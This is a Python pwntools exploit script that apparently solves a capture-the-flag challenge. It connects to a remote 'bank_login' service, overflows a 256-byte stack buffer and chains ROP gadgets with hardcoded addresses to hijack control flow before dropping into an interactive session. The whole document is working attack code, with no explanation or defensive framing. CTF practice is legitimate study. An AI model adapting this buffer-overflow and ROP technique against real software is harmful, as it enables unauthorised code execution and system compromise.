#!/usr/bin/env python3

from pwn import *

# Start the vulnerable process
# p =  process("./bank_login")
p =  remote("challenges.ists.io", 1339)
# gdb.attach(p, gdbscript="b *0x000000000040135c\nb *0x00401261\nb open")  # Adjust path if needed

# Target return address after overflow
target_ret_addr = 0x000000000040135c
align_stack = 0x00401261
# Desired RBP value to restore
# target_rbp = p64(0x00007ffdec97f320)

str1_addr = 0x40205d
str2_addr = 0x00402068
# Offset: The buffer is at rbp-0x100, meaning we need to fill 256 bytes to reach saved RBP
buf_len = 0x100

pop_rdi_gadget = 0x000000000040123e
pop_rsi_gadget = 0x000000000040124b
pop_rdx_gadget = 0x0000000000401258
ret_gadget = 0x000000000040101a

# Construct the payload
of = b"A" * buf_len      # Fill buffer
# payload += target_rbp        # Overwrite saved RBP

payload = of + p64(pop_rdi_gadget) + p64(pop_rdi_gadget) + p64(str1_addr) + p64(pop_rsi_gadget) + p64(str2_addr) + p64(pop_rdx_gadget) + p64(0x0) + p64(align_stack) + p64(target_ret_addr) + p64(target_ret_addr) # first target_addr is a placeholder for more advanced rop

#p.sendline(b'a')
#p.sendline(b'a')
# Send the payload
#p.sendline(payload)

# p.recvuntil("Username:")
# p.recvline()
p.sendline(b'b')
# p.recvuntil("Password:")
# p.recvline()
p.sendline(b'a')
# p.recvuntil("Please enter your security token:")
# p.recvline()
p.sendline(payload)

# Drop to interactive mode to see the results
p.interactive()
